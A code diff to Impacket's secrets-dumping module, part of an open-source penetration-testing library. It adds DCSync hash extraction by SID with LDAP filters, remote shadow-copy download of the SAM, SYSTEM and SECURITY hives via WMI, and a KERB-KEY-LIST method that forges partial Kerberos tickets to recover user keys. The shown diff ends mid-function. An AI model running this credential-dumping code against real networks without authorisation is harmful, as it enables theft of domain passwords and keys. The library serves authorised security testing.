@@ -1,6 +1,8 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -41,7 +43,7 @@
 #   - https://code.google.com/p/creddump/
 #   - https://lab.mediaservice.net/code/cachedump.rb
 #   - https://insecurety.net/?p=768
-#   - http://www.beginningtoseethelight.org/ntsecurity/index.htm
+#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
 #   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
 #   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
 #
@@ -59,15 +61,17 @@ import string
 import time
 from binascii import unhexlify, hexlify
 from collections import OrderedDict
-from datetime import datetime
+from datetime import datetime, timedelta, timezone
 from struct import unpack, pack
 from six import b, PY2
 
 from impacket import LOG
 from impacket import system_errors
 from impacket import winregistry, ntlm
+from impacket.ldap.ldap import SimplePagedResultsControl, LDAPSearchError
+from impacket.ldap.ldapasn1 import SearchResultEntry
 from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
-from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5.dtypes import NULL, SID
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
@@ -75,7 +79,7 @@ from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, IDispatch, DISPPARAMS, D
 from impacket.dcerpc.v5.dcomrt import DCOMConnection, OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
     OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
     IRemUnknown2, INTERFACE
-from impacket.ese import ESENT_DB
+from impacket.ese import ESENT_DB, getUnixTime
 from impacket.dpapi import DPAPI_SYSTEM
 from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ
 from impacket.nt_errors import STATUS_MORE_ENTRIES
@@ -84,14 +88,30 @@ from impacket.structure import hexdump
 from impacket.uuid import string_to_bin
 from impacket.crypto import transformKey
 from impacket.krb5 import constants
-from impacket.krb5.crypto import string_to_key
+from impacket.krb5.asn1 import Ticket as TicketAsn1, EncTicketPart, AP_REQ, seq_set, Authenticator, TGS_REQ, \
+    seq_set_iter, TGS_REP, EncTGSRepPart, KERB_KEY_LIST_REP
+from impacket.krb5.constants import ProtocolVersionNumber, TicketFlags, PrincipalNameType, encodeFlags, EncryptionTypes
+from impacket.krb5.crypto import string_to_key, Key, _enctype_table
+from impacket.krb5.kerberosv5 import sendReceive
+from impacket.krb5.types import KerberosTime, Principal, Ticket
 try:
     from Cryptodome.Cipher import DES, ARC4, AES
     from Cryptodome.Hash import HMAC, MD4, MD5
 except ImportError:
     LOG.critical("Warning: You don't have any crypto installed. You need pycryptodomex")
     LOG.critical("See https://pypi.org/project/pycryptodomex/")
+try:
+    import pyasn1
+    from pyasn1.type.univ import noValue, SequenceOf, Integer
+    from pyasn1.codec.der import encoder, decoder
+except ImportError:
+    LOG.critical('This module needs pyasn1 installed')
 
+try:
+    rand = random.SystemRandom()
+except NotImplementedError:
+    rand = random
+    pass
 
 # Structures
 # Taken from https://insecurety.net/?p=768
@@ -105,7 +125,7 @@ class SAM_KEY_DATA(Structure):
         ('Reserved','<Q=0'),
     )
 
-# Structure taken from mimikatz (@gentilkiwi) in the context of https://github.com/SecureAuthCorp/impacket/issues/326
+# Structure taken from mimikatz (@gentilkiwi) in the context of https://github.com/fortra/impacket/issues/326
 # Merci! Makes it way easier than parsing manually.
 class SAM_HASH(Structure):
     structure = (
@@ -161,7 +181,7 @@ class DOMAIN_ACCOUNT_F(Structure):
 #        ('Unknown4','<L=0'),
     )
 
-# Great help from here http://www.beginningtoseethelight.org/ntsecurity/index.htm
+# Great help from here https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
 class USER_ACCOUNT_V(Structure):
     structure = (
         ('Unknown','12s=b""'),
@@ -348,10 +368,11 @@ class RemoteFile:
         return "\\\\%s\\ADMIN$\\%s" % (self.__smbConnection.getRemoteHost(), self.__fileName)
 
 class RemoteOperations:
-    def __init__(self, smbConnection, doKerberos, kdcHost=None):
+    def __init__(self, smbConnection, doKerberos, kdcHost=None, ldapConnection=None):
         self.__smbConnection = smbConnection
         if self.__smbConnection is not None:
             self.__smbConnection.setTimeout(5*60)
+        self.__ldapConnection = ldapConnection
         self.__serviceName = 'RemoteRegistry'
         self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
         self.__rrp = None
@@ -404,6 +425,9 @@ class RemoteOperations:
         self.__rrp = rpc.get_dce_rpc()
         self.__rrp.connect()
         self.__rrp.bind(rrp.MSRPC_UUID_RRP)
+
+    def getRRP(self):
+        return self.__rrp
 
     def connectSamr(self, domain):
         rpc = transport.DCERPCTransportFactory(self.__stringBindingSamr)
@@ -501,6 +525,9 @@ class RemoteOperations:
             LOG.error("Couldn't get DC info for domain %s" % self.__domainName)
             raise Exception('Fatal, aborting')
 
+    def getSamr(self):
+        return self.__samr
+
     def getDrsr(self):
         return self.__drsr
 
@@ -513,7 +540,40 @@ class RemoteOperations:
         resp = drsuapi.hDRSCrackNames(self.__drsr, self.__hDrs, 0, formatOffered, formatDesired, (name,))
         return resp
 
-    def DRSGetNCChanges(self, userEntry):
+    # Wrapper for calling _DRSGetNCChanges with a GUID
+    def DRSGetNCChangesGuid(self, userGuid):
+        dsName = drsuapi.DSNAME()
+        dsName['SidLen'] = 0
+        dsName['Guid'] = string_to_bin(userGuid[1:-1])
+        dsName['Sid'] = ''
+        dsName['NameLen'] = 0
+        dsName['StringName'] = ('\x00')
+        dsName['structLen'] = len(dsName.getData())
+
+        return self._DRSGetNCChanges(userGuid, dsName)
+
+    # Wrapper for calling _DRSGetNCChanges with a SID
+    def DRSGetNCChangesSid(self, userSid):
+
+        # Convert string SID to 2.4.2.2 packet SID
+        tsid = SID()
+        tsid.fromCanonical(userSid)
+        packetSid  = pack("<B", tsid.fields['Revision'])
+        packetSid += pack("<B", tsid.fields['SubAuthorityCount'])
+        packetSid += tsid.fields['IdentifierAuthority'].fields['Value']
+        packetSid += tsid.fields['SubAuthority']
+
+        dsName = drsuapi.DSNAME()
+        dsName['SidLen'] = len(packetSid)
+        dsName['Guid'] = 0
+        dsName['Sid'] = packetSid
+        dsName['NameLen'] = 0
+        dsName['StringName'] = ('\x00')
+        dsName['structLen'] = len(dsName.getData())
+
+        return self._DRSGetNCChanges(userSid, dsName)
+
+    def _DRSGetNCChanges(self, userEntry, dsName):
         if self.__drsr is None:
             self.__connectDrds()
 
@@ -525,15 +585,6 @@ class RemoteOperations:
         request['pmsgIn']['tag'] = 8
         request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
         request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid
-
-        dsName = drsuapi.DSNAME()
-        dsName['SidLen'] = 0
-        dsName['Guid'] = string_to_bin(userEntry[1:-1])
-        dsName['Sid'] = ''
-        dsName['NameLen'] = 0
-        dsName['StringName'] = ('\x00')
-
-        dsName['structLen'] = len(dsName.getData())
 
         request['pmsgIn']['V8']['pNC'] = dsName
 
@@ -577,6 +628,72 @@ class RemoteOperations:
             resp = e.get_packet()
         return resp
 
+    def getGroupsInDomain(self):
+        try:
+            resp = samr.hSamrEnumerateGroupsInDomain(self.__samr, self.__domainHandle)
+        except DCERPCException as e:
+            if str(e).find('STATUS_MORE_ENTRIES') < 0:
+                raise
+            resp = e.get_packet()
+        return resp
+
+    def getAliasesInDomain(self):
+        try:
+            resp = samr.hSamrEnumerateAliasesInDomain(self.__samr, self.__domainHandle)
+        except DCERPCException as e:
+            if str(e).find('STATUS_MORE_ENTRIES') < 0:
+                raise
+            resp = e.get_packet()
+        return resp
+
+    def getMembersInGroup(self, rid):
+        ans = samr.hSamrOpenGroup(self.__samr, self.__domainHandle, groupId=rid)
+        resp = samr.hSamrGetMembersInGroup(self.__samr, ans['GroupHandle'])
+
+        return resp
+
+    def getMembersInAlias(self, rid):
+        ans = samr.hSamrOpenAlias(self.__samr, self.__domainHandle, aliasId=rid)
+        resp = samr.hSamrGetMembersInAlias(self.__samr, ans['AliasHandle'])
+
+        return resp
+
+    def getDomainUsersLDAP(self, searchFilter):
+        domainUsers = []
+        if self.__ldapConnection is None:
+            LOG.error('Failed to establish LDAP connection, the user list will be empty')
+            return domainUsers
+
+        try:
+            LOG.debug('Search Filter=%s' % searchFilter)
+            sc = SimplePagedResultsControl(size=100)
+            resp = self.__ldapConnection.search(searchFilter=searchFilter, attributes=['msDS-PrincipalName','objectSid'], sizeLimit=0, searchControls=[sc])
+        except LDAPSearchError:
+            raise
+
+        self.__ldapConnection.close()
+
+        for item in resp:
+            if isinstance(item, SearchResultEntry):
+                msDSPrincipalName = ''
+                userSid = ''
+                try:
+                    for attribute in item['attributes']:
+                        if str(attribute['type']) == 'msDS-PrincipalName':
+                            msDSPrincipalName = attribute['vals'][0].asOctets().decode('utf-8')
+                        if str(attribute['type']) == 'objectSid':
+                            tsid = SID(attribute['vals'][0].asOctets())
+                            userSid = tsid.formatCanonical()
+                except Exception as e:
+                    LOG.debug("Exception", exc_info=True)
+                    LOG.error('Skipping item, cannot process due to error %s' % str(e))
+                    pass
+                else:
+                    LOG.debug('DA msDS-PrincipalName: %s, SID: %s' % (msDSPrincipalName, userSid))
+                    domainUsers.append([msDSPrincipalName, userSid])
+
+        return domainUsers
+
     def getDomainSid(self):
         if self.__domainSid is not None:
             return self.__domainSid
@@ -585,6 +702,9 @@ class RemoteOperations:
             self.connectSamr(self.getMachineNameAndDomain()[1])
 
         return self.__domainSid
+
+    def getDomainHandle(self):
+        return self.__domainHandle
 
     def getMachineKerberosSalt(self):
         """
@@ -617,6 +737,14 @@ class RemoteOperations:
                                                                                       'wki100_langroup'][:-1]
         else:
             return self.__smbConnection.getServerName(), self.__smbConnection.getServerDomain()
+
+    def getDNSDomain(self):
+        if self.__smbConnection.getServerDNSDomainName() == '':
+            # Todo: figure out an RPC call that gives us the domain FQDN
+            # instead of the NETBIOS name as NetrWkstaGetInfo does
+            return b''
+        else:
+            return self.__smbConnection.getServerDNSDomainName()
 
     def getDefaultLoginAccount(self):
         try:
@@ -794,11 +922,11 @@ class RemoteOperations:
         except:
             raise Exception("Can't open %s hive" % hiveName)
         keyHandle = ans['phkResult']
-        rrp.hBaseRegSaveKey(self.__rrp, keyHandle, tmpFileName)
+        rrp.hBaseRegSaveKey(self.__rrp, keyHandle, '..\\Temp\\'+tmpFileName)
         rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
         rrp.hBaseRegCloseKey(self.__rrp, regHandle)
         # Now let's open the remote file, so it can be read later
-        remoteFileName = RemoteFile(self.__smbConnection, 'SYSTEM32\\'+tmpFileName)
+        remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\'+tmpFileName)
         return remoteFileName
 
     def saveSAM(self):
@@ -927,6 +1055,41 @@ class RemoteOperations:
 
         dcom.disconnect()
 
+    def __wmiCreateShadow(self, volume):
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
+        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        iWbemLevel1Login.RemRelease()
+
+        win32ShadowCopy,_ = iWbemServices.GetObject('Win32_ShadowCopy')
+        LOG.debug('Trying to create SS remotely via WMI')
+        result = win32ShadowCopy.Create(volume, 'ClientAccessible')
+
+        shadowId = result.ShadowID
+        LOG.debug('Got ShadowID %s' % shadowId)
+
+        dcom.disconnect()
+
+        return shadowId
+
+    def __wmiDeleteShadow(self, ssID):
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
+        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        iWbemLevel1Login.RemRelease()
+
+        wmiPath = 'Win32_ShadowCopy.ID="%s"' % ssID
+        LOG.debug('Trying to delete ShadowCopy')
+        iWbemServices.DeleteInstance(wmiPath)
+
+        dcom.disconnect()
+
     def __executeRemote(self, data):
         self.__tmpServiceName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
@@ -1000,8 +1163,13 @@ class RemoteOperations:
     def saveNTDS(self):
         LOG.info('Searching for NTDS.dit')
         # First of all, let's try to read the target NTDS.dit registry entry
-        ans = rrp.hOpenLocalMachine(self.__rrp)
-        regHandle = ans['phKey']
+        try:
+            ans = rrp.hOpenLocalMachine(self.__rrp)
+            regHandle = ans['phKey']
+        except:
+            # Can't open the root key
+            return None
+
         try:
             ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters')
             keyHandle = ans['phkResult']
@@ -1064,6 +1232,30 @@ class RemoteOperations:
         remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
 
         return remoteFileName
+
+    def createSSandDownload(self, volume, localPath):
+        LOG.info('Creating SS')
+        ssID = self.__wmiCreateShadow(volume)
+        LOG.info('Getting SMB equivalent PATH to access remotely the SS')
+        gmtSMBPath = self.__smbConnection.listSnapshots(self.__smbConnection.connectTree('ADMIN$'), '/')[0]
+        LOG.debug('Got SMB GMT Path: %s' % gmtSMBPath)
+        LOG.debug('Performed SS via WMI and got info')
+
+        # Array of tuples of (local path to download, remote path of file)
+        paths = [('%s/SAM' % localPath, '%s\\System32\\config\\SAM' % gmtSMBPath),
+                 ('%s/SYSTEM' % localPath, '%s\\System32\\config\\SYSTEM' % gmtSMBPath),
+                 ('%s/SECURITY' % localPath, '%s\\System32\\config\\SECURITY' % gmtSMBPath)]
+
+        for p in paths:
+            with open(p[0], 'wb') as local_file:
+                self.__smbConnection.getFile('ADMIN$', p[1], local_file.write)
+
+        # Return a list of the local paths where SAM, SYSTEM and SECURITY were downloaded
+        LOG.debug('Trying to delete ShadowSnapshot')
+        self.__wmiDeleteShadow(ssID)
+
+        LOG.debug('Downloaded SAM, SYSTEM and SECURITY from Shadow Snapshot. Dumping...')
+        return list(zip(*paths))[0]
 
 class CryptoCommon:
     # Common crypto stuff used over different classes
@@ -1240,7 +1432,7 @@ class SAMHashes(OfflineRegistry):
             userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')
 
             if userAccount['NTHashLength'] == 0:
-                logging.error('SAM hashes extraction for user %s failed. The account doesn\'t have hash information.' % userName)
+                logging.debug('The account %s doesn\'t have hash information.' % userName)
                 continue
 
             encNTHash = b''
@@ -1460,11 +1652,12 @@ class LSASecrets(OfflineRegistry):
                 userName = plainText[:record['UserLength']].decode('utf-16le')
                 plainText = plainText[self.__pad(record['UserLength']) + self.__pad(record['DomainNameLength']):]
                 domainLong = plainText[:self.__pad(record['DnsDomainNameLength'])].decode('utf-16le')
+                timestamp = datetime.fromtimestamp(getUnixTime(record['LastWrite']), tz=timezone.utc)
 
                 if self.__vistaStyle is True:
-                    answer = "%s/%s:$DCC2$%s#%s#%s" % (domainLong, userName, iterationCount, userName, hexlify(encHash).decode('utf-8'))
+                    answer = "%s/%s:$DCC2$%s#%s#%s: (%s)" % (domainLong, userName, iterationCount, userName, hexlify(encHash).decode('utf-8'), timestamp)
                 else:
-                    answer = "%s/%s:%s:%s" % (domainLong, userName, hexlify(encHash).decode('utf-8'), userName)
+                    answer = "%s/%s:%s:%s: (%s)" % (domainLong, userName, hexlify(encHash).decode('utf-8'), userName, timestamp)
 
                 self.__cachedItems.append(answer)
                 self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_HASHED, answer)
@@ -1559,9 +1752,9 @@ class LSASecrets(OfflineRegistry):
             extrasecret = "%s:plain_password_hex:%s" % (printname, hexlify(secretItem).decode('utf-8'))
             self.__secretItems.append(extrasecret)
             self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA, extrasecret)
-        elif re.match('^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$', upperName) is not None:
+        elif re.match(r'^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$', upperName) is not None:
             # Decode stored security questions
-            sid = re.search('^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$', upperName).group(1)
+            sid = re.search(r'^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$', upperName).group(1)
             try:
                 strDecoded = secretItem.decode('utf-16le').replace('\xa0',' ')
                 strDecoded = json.loads(strDecoded)
@@ -1864,7 +2057,7 @@ class NTDSHashes:
 
     def __init__(self, ntdsFile, bootKey, isRemote=False, history=False, noLMHash=True, remoteOps=None,
                  useVSSMethod=False, justNTLM=False, pwdLastSet=False, resumeSession=None, outputFileName=None,
-                 justUser=None, printUserStatus=False,
+                 justUser=None, skipUser=None,ldapFilter=None, printUserStatus=False,
                  perSecretCallback = lambda secretType, secret : _print_helper(secret),
                  resumeSessionMgr=ResumeSessionMgrInFile):
         self.__bootKey = bootKey
@@ -1887,6 +2080,8 @@ class NTDSHashes:
         self.__resumeSession = resumeSessionMgr(resumeSession)
         self.__outputFileName = outputFileName
         self.__justUser = justUser
+        self.__ldapFilter = ldapFilter
+        self.__skipUser = skipUser
         self.__perSecretCallback = perSecretCallback
 
 		# these are all the columns that we need to get the secrets.
@@ -2366,7 +2561,16 @@ class NTDSHashes:
         hashesOutputFile = None
         keysOutputFile = None
         clearTextOutputFile = None
+        skipUsers = []
 
+        if self.__skipUser:
+            if os.path.isfile(self.__skipUser):
+                f = open(self.__skipUser, 'r')
+                skipUsers = [ line.strip() for line in f ]
+                f.close()
+            else:
+                skipUsers = self.__skipUser.split(',')
+        
         if self.__useVSSMethod is True:
             if self.__NTDS is None:
                 # No NTDS.dit file provided and were asked to use VSS
@@ -2379,7 +2583,7 @@ class NTDSHashes:
                         try:
                             self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
                         except:
-                            if os.getenv('KRB5CCNAME') is not None and self.__justUser is not None:
+                            if os.getenv('KRB5CCNAME') is not None and (self.__justUser is not None or self.__ldapFilter is not None):
                                 # RemoteOperations failed. That might be because there was no way to log into the
                                 # target system. We just have a last resort. Hope we have tickets cached and that they
                                 # will work
@@ -2463,6 +2667,7 @@ class NTDSHashes:
                 LOG.info('Using the DRSUAPI method to get NTDS.DIT secrets')
                 status = STATUS_MORE_ENTRIES
                 enumerationContext = 0
+                lookupBySid = True
 
                 # Do we have to resume from a previously saved session?
                 if self.__resumeSession.hasResumeData():
@@ -2470,8 +2675,8 @@ class NTDSHashes:
                     LOG.info('Resuming from SID %s, be patient' % resumeSid)
                 else:
                     resumeSid = None
-                    # We do not create a resume file when asking for a single user
-                    if self.__justUser is None:
+                    # We do not create a resume file when asking for individual users
+                    if self.__justUser is None and self.__ldapFilter is None:
                         self.__resumeSession.beginTransaction()
 
                 if self.__justUser is not None:
@@ -2496,7 +2701,7 @@ class NTDSHashes:
                             raise Exception("%s: %s" % system_errors.ERROR_MESSAGES[
                                 0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
 
-                        userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
+                        userRecord = self.__remoteOps.DRSGetNCChangesGuid(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
                         #userRecord.dump()
                         replyVersion = 'V%d' % userRecord['pdwOutVersion']
                         if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
@@ -2516,13 +2721,60 @@ class NTDSHashes:
                         LOG.error("Error while processing user!")
                         LOG.debug("Exception", exc_info=True)
                         LOG.error(str(e))
+                elif self.__ldapFilter is not None:
+                    resp = self.__remoteOps.getDomainUsersLDAP(self.__ldapFilter)
+                    formatOffered = drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
+                    for (user, userSid) in resp:
+
+                        # Try to lookup by SID, but fallback to DSCrackNames for GUID lookups otherwise
+                        if lookupBySid:
+                            try:
+                                userRecord = self.__remoteOps.DRSGetNCChangesSid(userSid)
+                            except drsuapi.DCERPCSessionError as e:
+                                LOG.debug("SID lookup unsuccessful, falling back to DRSCrackNames/GUID lookups")
+                                lookupBySid = False
+
+                        # We may need to run the above request again if it failed so this can't be an else
+                        if not lookupBySid:
+                            crackedName = self.__remoteOps.DRSCrackNames(formatOffered,
+                                                                         drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
+                                                                         name=user)
+
+                            if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
+                                if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
+                                    raise Exception("%s: %s" % system_errors.ERROR_MESSAGES[
+                                        0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
+
+                                userRecord = self.__remoteOps.DRSGetNCChangesGuid(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
+                            else:
+                                LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
+                                            crackedName['pmsgOut']['V1']['pResult']['cItems'], user)
+)
+                        #userRecord.dump()
+                        replyVersion = 'V%d' % userRecord['pdwOutVersion']
+                        if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
+                            raise Exception('DRSGetNCChanges didn\'t return any object!')
+
+                        try:
+                            self.__decryptHash(userRecord,
+                                               userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
+                                               hashesOutputFile)
+                            if self.__justNTLM is False:
+                                self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
+                                                               'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
+
+                        except Exception as e:
+                            LOG.error("Error while processing user %s!" % user)
+                            LOG.debug("Exception", exc_info=True)
+                            LOG.error(str(e))
                 else:
                     while status == STATUS_MORE_ENTRIES:
                         resp = self.__remoteOps.getDomainUsers(enumerationContext)
 
                         for user in resp['Buffer']['Buffer']:
                             userName = user['Name']
-
+                            if userName in skipUsers:
+                                continue
                             userSid = "%s-%i" % (self.__remoteOps.getDomainSid(), user['RelativeId'])
                             if resumeSid is not None:
                                 # Means we're looking for a SID before start processing back again
@@ -2534,28 +2786,37 @@ class NTDSHashes:
                                     LOG.debug('Skipping SID %s since it was processed already' % userSid)
                                 continue
 
-                            # Let's crack the user sid into DS_FQDN_1779_NAME
-                            # In theory I shouldn't need to crack the sid. Instead
-                            # I could use it when calling DRSGetNCChanges inside the DSNAME parameter.
-                            # For some reason tho, I get ERROR_DS_DRA_BAD_DN when doing so.
-                            crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME,
-                                                                         drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
-                                                                         name=userSid)
+                            # Try to lookup by SID, but fallback to DSCrackNames for GUID lookups otherwise
+                            if lookupBySid:
+                                try:
+                                    userRecord = self.__remoteOps.DRSGetNCChangesSid(userSid)
+                                except drsuapi.DCERPCSessionError as e:
+                                    LOG.debug("SID lookup unsuccessful, falling back to DRSCrackNames/GUID lookups")
+                                    lookupBySid = False
 
-                            if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
-                                if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
-                                    LOG.error("%s: %s" % system_errors.ERROR_MESSAGES[
-                                        0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
-                                    break
-                                userRecord = self.__remoteOps.DRSGetNCChanges(
-                                    crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
-                                # userRecord.dump()
-                                replyVersion = 'V%d' % userRecord['pdwOutVersion']
-                                if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
-                                    raise Exception('DRSGetNCChanges didn\'t return any object!')
-                            else:
-                                LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
-                                crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
+                            # We may need to run the above request again if it failed so this can't be an else
+                            if not lookupBySid:
+                                crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME,
+                                                                             drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
+                                                                             name=userSid)
+
+                                if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
+                                    if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
+                                        LOG.error("%s: %s" % system_errors.ERROR_MESSAGES[
+                                            0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
+                                        break
+                                    userRecord = self.__remoteOps.DRSGetNCChangesGuid(
+                                        crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
+
+                                else:
+                                    LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
+                                    crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
+
+                            # userRecord.dump()
+                            replyVersion = 'V%d' % userRecord['pdwOutVersion']
+                            if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
+                                raise Exception('DRSGetNCChanges didn\'t return any object!')
+
                             try:
                                 self.__decryptHash(userRecord,
                                                    userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
@@ -2577,7 +2838,7 @@ class NTDSHashes:
 
                 # Everything went well and we covered all the users
                 # Let's remove the resume file is we had created it
-                if self.__justUser is None:
+                if self.__justUser is None and self.__ldapFilter is None:
                     self.__resumeSession.clearResumeData()
 
             LOG.debug("Finished processing and printing user's hashes, now printing supplemental information")
@@ -2674,6 +2935,247 @@ class LocalOperations:
             return False
         LOG.debug('LMHashes are NOT being stored')
         return True
+
+
+class KeyListSecrets:
+    def __init__(self, domainName, kdc, kvno, rodcKey, remoteOps=None):
+        self.__remoteOps = remoteOps
+        self.__keyVersionNumber = kvno
+        self.__rodcKey = rodcKey
+        if self.__remoteOps is None:
+            self.__kdcHostName = kdc
+            self.__domain = domainName
+        else:
+            self.__kdcHostName = self.__remoteOps.getMachineNameAndDomain()[0]
+            self.__domain = self.__remoteOps.getDNSDomain()
+
+    def dump(self):
+        LOG.info('Using the KERB-KEY-LIST method to get secrets')
+        self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
+        targetList = self.getAllowedUsersToReplicate()
+        for targetUser in targetList:
+            user = targetUser.split(":")[0]
+            targetUserName = Principal('%s' % user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            partialTGT, sessionKey = self.createPartialTGT(targetUserName)
+            fullTGT = self.getFullTGT(targetUserName, partialTGT, sessionKey)
+            if fullTGT is not None:
+                key = self.getKey(fullTGT, sessionKey)
+                print(self.__domain + "\\" + targetUser + ":" + key[2:])
+
+    def createPartialTGT(self, userName):
+        # We need the ticket template
+        partialTGT = TicketAsn1()
+        partialTGT['tkt-vno'] = ProtocolVersionNumber.pvno.value
+        partialTGT['realm'] = self.__domain
+        partialTGT['sname'] = noValue
+        partialTGT['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
+        partialTGT['sname']['name-string'][0] = 'krbtgt'
+        partialTGT['sname']['name-string'][1] = self.__domain
+        partialTGT['enc-part'] = noValue
+        partialTGT['enc-part']['kvno'] = self.__keyVersionNumber << 16
+        partialTGT['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
+
+        # We create the encrypted ticket part
+        encTicketPart = EncTicketPart()
+        # We need these flags: 01000000100000010000000000000000
+        flags = list()
+        flags.append(TicketFlags.forwardable.value)
+        flags.append(TicketFlags.renewable.value)
+        flags.append(TicketFlags.enc_pa_rep.value)
+
+        # We fill in the encripted part
+        encTicketPart['flags'] = encodeFlags(flags)
+        encTicketPart['key'] = noValue
+        encTicketPart['key']['keytype'] = partialTGT['enc-part']['etype']
+        encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
+        encTicketPart['crealm'] = self.__domain
+        encTicketPart['cname'] = noValue
